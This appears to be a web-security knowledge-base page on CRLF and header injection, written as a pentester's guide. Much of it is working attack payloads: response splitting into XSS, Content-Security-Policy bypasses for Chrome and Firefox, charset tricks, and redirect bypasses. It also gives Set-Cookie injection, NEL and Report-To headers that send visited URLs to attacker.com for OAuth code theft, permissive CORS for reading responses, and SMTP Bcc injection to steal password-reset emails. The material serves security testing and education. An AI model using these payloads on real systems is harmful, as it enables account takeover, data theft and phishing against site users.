---
description: >-
  Manipulate HTTP headers in your favor or insert completely new ones with even
  more control
---

# CRLF / Header Injection

HTTP is a plaintext protocol that works with Carriage Return (`\r`) Line Feed (`\n`) delimited headers. When user input lands in the **response headers** from an HTTP server, injecting these CRLF characters can result in some client-side attacks abusing headers.

## Response Splitting

The first thing you should think about when you are able to inject a newline into a response, is if you can inject two newlines. This signifies the end of headers and start of body for HTTP responses, so you'll suddenly be writing a body. In HTML this means you can write `<script>` tags or similar things to achieve [cross-site-scripting-xss](cross-site-scripting-xss/ "mention"):

```http
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 36
Some-Header: [INPUT]

<body>This is the normal body</body>
```

In place of `[INPUT]`, we will now put two CRLF sequences followed by the HTML body we want to inject.

[**Payload**](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(false\)\&input=eA0KDQo8c2NyaXB0PmFsZXJ0KG9yaWdpbik8L3NjcmlwdD4\&ieol=CRLF): `x%0D%0A%0D%0A<script>alert(origin)</script>`

<pre class="language-http" data-title="Exploit"><code class="lang-http">HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 36
Some-Header: x
<strong>
</strong><strong>&#x3C;script>alert(origin)&#x3C;/script>
</strong>
&#x3C;body>This is the normal body&#x3C;/body>
</code></pre>

Note that the `Content-Length:` is still limited, it cuts off the response at the new end, but our injected content comes first:

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>Example in browser showing injected content and partially original content</p></figcaption></figure>

### Content Type

If the response isn't HTML but something like JSON instead, you can still **overwrite** the `Content-Type:` header with another one. The last one counts!

[**Payload**](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(false\)\&input=eA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWwNCg0KPHNjcmlwdD5hbGVydChvcmlnaW4pPC9zY3JpcHQ%2B\&ieol=CRLF): `x%0D%0AContent-Type:%20text/html%0D%0A%0D%0A%3Cscript%3Ealert(origin)%3C/script%3E`

<pre class="language-http" data-title="Payload"><code class="lang-http">HTTP/1.1 200 OK
Content-Type: application/json
Some-Header: x
<strong>Content-Type: text/html
</strong><strong>
</strong><strong>&#x3C;script>alert(origin)&#x3C;/script>
</strong>
{"some": "json"}
</code></pre>

More tricks for `[INPUT]` _inside_ the existing `Content-Type` header itself can be found in [this writeup](https://gist.github.com/avlidienbrunn/8db7f692404cdd3c325aa20d09437e13). It contains a trick to escape the HTML context if your payload in the body is limited.

### Content-Security-Policy

A `Content-Security-Policy:` may be in effect on the resulting page if it comes _before your injection point_. If your XSS is limited by this, [content-security-policy-csp.md](cross-site-scripting-xss/content-security-policy-csp.md "mention") bypasses are the first thing you should look at of course. Using this Response Splitting gadget, there are some unique extra bypasses for both Chrome and Firefox.

#### Chrome load `'self'` with Content-Length truncation

It's possible to craft almost a completely arbitrary response using Response Splitting, with your exact needed headers and body. If `script-src 'self'` is defined, you may only load scripts from the current domain, which seems safe. We can bypass it, however, by crafting a 2nd Response Splitting URL and loading that as a script:

{% code overflow="wrap" %}
```html
<script src="/vuln?inject=x%0D%0AContent-Type:%20text/javascript%0D%0A%0D%0Aalert(origin)"></script>
```
{% endcode %}

This might load a response like this:

```http
HTTP/1.1 200 OK
X-Inject: x
Content-Type: text/javascript

alert(origin)<!DOCTYPE html>
<html>
<h1>Hello, world!</h1>
...
```

> Uncaught SyntaxError: Unexpected identifier `'html'`

It quickly throws an error, because of the suffix content from the original uninjected page. The trick to solving this shared by [@siunam321](https://x.com/siunam321/status/1962525358680604980), is to add a small `Content-Length:` header that cuts off the body right after our payload:

<pre class="language-http"><code class="lang-http">HTTP/1.1 200 OK
X-Inject: x
Content-Type: text/javascript
<strong>Content-Length: 13
</strong>
alert(origin)
</code></pre>

This will execute successfully, so the final payload starting from the initial HTML page with a CSP becomes:

{% code title="URL" overflow="wrap" %}
```url
/vuln?inject=x%0D%0AContent-Type:%20text/html%0D%0A%0D%0A%3Cscript%20src=%22%2Fvuln%3Finject%3Dx%250D%250AContent-Type:%2520application%2Fjavascript%250D%250AContent-Length%3A%252013%250D%250A%250D%250Aalert%28origin%29%22%3E%3C/script%3E
```
{% endcode %}

{% code title="HTTP Response" %}
```http
HTTP/1.1 200 OK
X-Inject: x
Content-Type: text/html

<script src="/vuln?inject=x%0D%0AContent-Type:%20application/javascript%0D%0AContent-Length:%2013%0D%0A%0D%0Aalert(origin)"></script>
```
{% endcode %}

#### Firefox replace CSP

But specifically in Firefox there is another trick that can almost _redefine_ the policy. [Issue 1864434](https://bugzilla.mozilla.org/show_bug.cgi?id=1864434) tracks this behavior where using the special `multipart/x-mixed-replace` content type, the body has the following structure:

<pre class="language-http"><code class="lang-http">HTTP/1.1 200 OK
Content-Type: multipart/x-mixed-replace; boundary=BOUNDARY

<strong>--BOUNDARY
</strong><strong>Content-Type: text/html
</strong><strong>
</strong><strong>&#x3C;h1>First&#x3C;/h1>
</strong><strong>--BOUNDARY
</strong><strong>Content-Type: text/plain
</strong><strong>
</strong><strong>Second message
</strong><strong>--BOUNDARY--
</strong></code></pre>

You may recognize the similarities with the `multipart/form-data` type commonly used in file upload requests. The body starts and ends with a boundary. Documents within those replace the previous one. The above would result in "Second message" in a `text/plain` content type to be displayed.

Interestingly, you can **replace** other headers too, like `Content-Security-Policy`. While it won't fully replace the header or specified directives, you **can only add directives** that the main header didn't specify, similar to if you would append content to the existing header. With `script-src` and `style-src` directives, you can use the uncommon [`script-src-elem`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src-elem) and [`style-src-elem`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/style-src-elem) to set a laxer policy for specifically `<script>` and `<style>`/`<link rel=stylesheet>` elements.\
You can just enable all of the unsafe features again:

<pre class="language-http"><code class="lang-http">HTTP/1.1 200 OK
<strong>Content-Security-Policy: script-src 'none'; style-src 'none'
</strong>Content-Type: multipart/x-mixed-replace; boundary=BOUNDARY

--BOUNDARY
<strong>Content-Type: text/html
</strong><strong>Content-Security-Policy: script-src-elem 'unsafe-inline'; script-style-elem https:
</strong><strong>
</strong><strong>&#x3C;script>alert(origin)&#x3C;/script>
</strong><strong>&#x3C;style>@import '...'&#x3C;/style>
</strong>--BOUNDARY--
</code></pre>

### Charset

If your input is filtered/sanitized, you can also abuse the _charset_ of the content type by overwriting it in a header. The UTF-16 charset, for example, has null bytes in between each character:

[**Payload**](https://gchq.github.io/CyberChef/#recipe=Subsection\('%5C%5Cr%5C%5Cn%5C%5Cr%5C%5Cn\(.*\)',true,true,false\)Encode_text\('UTF-16LE%20\(1200\)'\)Merge\(true\)URL_Encode\(false\)\&input=eA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTE2DQoNCjxzY3JpcHQ%2BYWxlcnQob3JpZ2luKTwvc2NyaXB0Pg\&ieol=CRLF\&oeol=CRLF): `x%0D%0AContent-Type:%20text/html;%20charset=UTF-16%0D%0A%0D%0A%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00(%00o%00r%00i%00g%00i%00n%00)%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00`

<pre class="language-http"><code class="lang-http">HTTP/1.1 200 OK
Content-Type: application/json
Some-Header: x
<strong>Content-Type: text/html; charset=UTF-16
</strong><strong>
</strong><strong>&#x3C;�s�c�r�i�p�t�>�a�l�e�r�t�(�o�r�i�g�i�n�)�&#x3C;�/�s�c�r�i�p�t�>�
</strong>
{"some": "json"}
</code></pre>

If XSS isn't an option, it can also be combined with [#utf-16-iframe-stylesheet-content](cross-site-scripting-xss/html-injection.md#utf-16-iframe-stylesheet-content "mention") to leak content in the response.

### Redirect with `Location:`

One common situation is when your injection point is the value of a `Location:` header in a 30X redirect. The problem is that the browser will normally just redirect to the given location _without rendering the body_. This prevents us from directly injecting a `<script>` tag, for example.

<pre class="language-http" data-title="Response"><code class="lang-http">HTTP/1.1 302 Found
Content-Type: text/html
<strong>Location: [INPUT]
</strong></code></pre>

First of all, an open redirect may be possible if the URL isn't validated strictly. See the following examples:

```http
Location: [INPUT]                   -> http://evil.com
Location: /[INPUT]                  -> //evil.com or /\evil.com
Location: http://example.com[INPUT] -> http://example.com@evil.com
Location: /any/path/[INPUT]         -> ../../dangerous/path
```

This isn't nearly as impactful as XSS though, but fortunately there are some tricks in both Chrome and Firefox that cause it to **ignore the redirect and show the body instead**. Chrome is the hardest, but simplest to understand. If the `Location:` is empty it will be ignored, otherwise it won't.

{% code title="Chrome" %}
```http
Location: 
```
{% endcode %}

[Some](https://www.gremwell.com/firefox-xss-302) [writeups](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) explain that on Firefox there is a more interesting trick, using the `resource://` protocol:

{% code title="Firefox" %}
```http
Location: resource://anything
```
{% endcode %}

With the above payloads, you can force the browser to stop redirecting and show the content instead. With the ability to insert newlines in the response you can give it a HTML body with XSS:

**Chrome** [**Payload**](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(false\)\&input=DQoNCjxzdmcgb25sb2FkPWFsZXJ0KCk%2B\&ieol=CRLF): `%0D%0A%0D%0A%3Csvg%20onload=alert()%3E`

```http
Location: 

<svg onload=alert()>
```

**Firefox** [**Payload**](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(false\)\&input=cmVzb3VyY2U6Ly9hbnl0aGluZw0KDQo8c3ZnIG9ubG9hZD1hbGVydCgpPg\&ieol=CRLF): `resource://anything%0D%0A%0D%0A%3Csvg%20onload=alert()%3E`

```http
Location: resource://anything

<svg onload=alert()>
```

#### Firefox XSS without CRLF

If you have **the same injection point** in a **response** both in the `Location:` and in the **body**, where you can escape the body for XSS with special characters, you can use the `resource://` prefix to ignore the redirect. After `?` special characters are allowed:

```http
HTTP/1.1 302 Found
Location: [INPUT]
Content-Type: text/html

<html>Object moved to <a href="[INPUT]">here</a></html>
```

**Payload**: `resource://test?"><img src onerror=alert()>`

{% code title="Exploit" %}
```http
HTTP/1.1 302 Found
Location: resource://test?"><img src onerror=alert()>
Content-Type: text/html

<html>Object moved to <a href="resource://test?"><img src onerror=alert()>">here</a></html>
```
{% endcode %}

If this protocol isn't allowed in your situation, try appending a correct `https://` URL _after it_ to see if it performs a partial match.

## Response Headers

If response splitting isn't an option for whatever reason, you may still get interesting results out of inject some special headers that the browser understands.

### Set-Cookie

One of the simplest is just setting a cookie in the response with the `Set-Cookie:` header. This has the same impact as [#cookie-tossing](cross-site-request-forgery-csrf.md#cookie-tossing "mention"), but if you're targeting the same host would also allow setting `__Host-` prefixed cookies.

You can only set one cookie per header, but this is no problem if you can inject multiple headers. One fact that makes this especially useful is the fact that it **works on redirects**:

```http
HTTP/1.1 302 Found
Location: /somewhere
Set-Cookie: xss=<script>alert(origin)</script>
```

### Link

The [`Link:`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Link) header is a special one that has many different features. In the header value you provide a link in between angle brackets (`<>`), followed by attributes like `rel=` that specify what it's used for. Using a comma (`,`) it's possible to provide multiple link rules in one header.

The following table shows which rel types are recognized. Note that not all of them actually do something, or work in the _header_ instead of a `<link>` tag:&#x20;

{% embed url="https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel" %}
List of all `rel=` attributes and their meaning
{% endembed %}

#### [`rel="stylesheet"`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel#stylesheet)

This header adds the link URL as a stylesheet to the returned page, allowing [css-injection.md](css-injection.md "mention"). The syntax is as follows:

```http
Link: <https://attacker.com>;rel=stylesheet
```

Only Firefox understands stylesheets through a header, it will be ignored in Chrome.\
[I found this once in the real world](https://bsky.app/profile/jorianwoltjer.com/post/3lhwnargkrc2m) in a partial `Link:` header injection that reflected the URL, to style the 404 page arbitrarily. It also shows that the first `rel=` attribute takes priority.

#### [`rel="preload"`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel#preload) with `referrerpolicy="unsafe-url"`

Due to what's arguably a chrome bug, injecting a header in a subresource request, even a cross-site one, you can leak the current URL in the `Referer:`. Check out [#link-response-header-with-preload](cross-site-scripting-xss/html-injection.md#link-response-header-with-preload "mention").

### NEL (Network Error Logging)

[Network Error Logging](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Network_Error_Logging) is a part of the [Reporting API](https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API), responsible for sending reports about certain things happening in your browser. These reports can be sent externally, for example to a server you control. One of the most useful for attackers is NEL which will **leak all URLs that get visited**. Using the `success_fraction` parameter it's also possible to leak successful URLs. `include_subdomains` allows leaking URLs upon DNS failures of domains under the one it was set on.

{% hint style="success" %}
**Tip**: a common pattern in _OAuth_ is sending a secret code through query parameters, and after planting a "backdoor" with this technique, you'll get these leaked URLs and can achieve ATO.
{% endhint %}

This is all configured using response headers, and once registered, will keep being active for quite a while (not only a single request). First, you need to define an endpoint to report to:

{% code title="Report-To:" %}
```json
{
  "group": "leak",
  "max_age": 600,
  "include_subdomains": true,
  "endpoints": [
    {
      "url": "https://attacker.com/report"
    }
  ]
}
```
{% endcode %}

Then, configure logging 100% of the error and 100% of the successful requests that created endpoint:

{% code title="NEL:" %}
```json
{
  "report_to": "leak",
  "include_subdomains": true,
  "success_fraction": 1,
  "failure_fraction": 1,
  "max_age": 600
}
```
{% endcode %}

Together, the headers you inject should look something like this:

{% code overflow="wrap" %}
```http
Report-To: {"group":"leak","max_age":600,"include_subdomains":true,"endpoints":[{"url":"https://attacker.com/report"}]}
NEL: {"report_to":"leak","include_subdomains":true,"success_fraction":1,"failure_fraction":1,"max_age":600}
```
{% endcode %}

From now on, the next 600 seconds (10 minutes) all top-level requests to the domain that these response headers were set on will be sent to [https://attacker.com/report](https://attacker.com/report). Requests will be batched and sent every minute, and debugging this can be annoying. There are some tips in the article below to get DevTools to show you which requests are queued:

{% embed url="https://developer.chrome.com/docs/capabilities/web-apis/reporting-api#use_devtools" %}
Explanation of the Reporting API and some debugging tips
{% endembed %}

You can also use the `--short-reporting-delay` startup flag in Chrome while testing to make the minute-delay shorter and receive reports instantly.

{% hint style="info" %}
**Tip**: while testing, make sure the host and reporting endpoint use `https://`, and Cloudflare is not overwriting it with its own `cf-nel`. Set up a working receiving server using [`interactsh-client -v`](https://github.com/projectdiscovery/interactsh).
{% endhint %}

### CORS

If your goal is to leak some content of the response that you are at the same time injecting into, this is possible by **adding permissive** [**CORS headers**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS#the_http_response_headers). For example:

{% code title="Response Headers" %}
```http
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Expose-Headers: X-Super-Sensitive-Header
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: DELETE, PUT, PATCH
```
{% endcode %}

If you can trigger the header injection via a `fetch()` request, this now allows you to read the body and any other headers it responds with:

```javascript
fetch("https://target.com/inject%0aAccess-Control-...").then(async r => {
  console.log(Object.fromEntries(r.headers.entries()));
  console.log(await r.text());    
});
```

{% hint style="warning" %}
**Note**: not all response headers are allowed to be read, such as `Location:` (or the in-between bodies of redirects) or `Set-Cookie`. It can often be used to fetch authenticated data and CSRF tokens, for example.
{% endhint %}

### Carriage return (`\r`) only

A protection some applications take to CRLF issues is **blocking newlines** (`\n`) in header values. While this sounds correct, the carriage return (`\r`) character is actually just as important to block.

**Chrome** can split headers by `\r` ([source](https://x.com/zakfedotkin/status/1963603867641287150)) allowing an injection without newlines to still use any of the attacks mentioned here under [#response-headers](crlf-header-injection.md#response-headers "mention"). For example:

<figure><img src="../../.gitbook/assets/image (78).png" alt="" width="371"><figcaption><p>Burp Suite response showing <code>Set-Cookie</code> injection with only <code>\r</code></p></figcaption></figure>

Even though Burp Suite does not recognize it as a new header, Chrome does, and the cookie will be set:

<figure><img src="../../.gitbook/assets/image (79).png" alt="" width="539"><figcaption><p>Chrome recognizing the header and saving the cookie to storage</p></figcaption></figure>

{% hint style="warning" %}
**Note**: It's not possible to split into the body this way, so for [#response-splitting](crlf-header-injection.md#response-splitting "mention")'s impact, you still require the use of newlines.
{% endhint %}

## SMTP

Just like HTTP, SMTP for sending emails is also a CRLF-delimited plaintext protocol with headers. These emails are often sent by applications automatically with information to you like a password reset or notifications. Such emails are often sensitive and if an attacker-controlled input can mess with the request it can get leaked, or malicious content can be injected.&#x20;

A typical SMTP request looks like this:

```xml
EHLO
MAIL FROM:sender@example.com
RCPT TO:recipient@example.com
DATA
From: sender@example.com
To: recipient@example.com
Subject: some subject

Content...
.

```

A common place to inject is the `RCPT TO:` SMTP header as this is where the email is sent to. By injecting CRLF characters, new headers like `RCPT TO:attacker@example.com` to receive a copy of the email in your inbox (very dangerous for secrets like **password reset** tokens!). \
More commonly you will also see an injection into the `DATA` section where headers like `Bcc` can be added to send a copy to yourself or add content to the email for an indistinguishable phishing attack. A common place is the `Subject` or `From`/`To` headers:

**Subject** [**Payload**](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(false\)\&input=YQ0KQmNjOiBhdHRhY2tlckBleGFtcGxlLmNvbQ0KDQo8aDE%2BUGhpc2hpbmchPC9oMT4\&ieol=CRLF): `a%0D%0ABcc:%20attacker@example.com%0D%0A%0D%0A%3Ch1%3EPhishing!%3C/h1%3E`

```
From: sender@example.com
To: recipient@example.com
Subject: a
Bcc: attacker@example.com

<h1>Phishing!</h1>
Content...
```
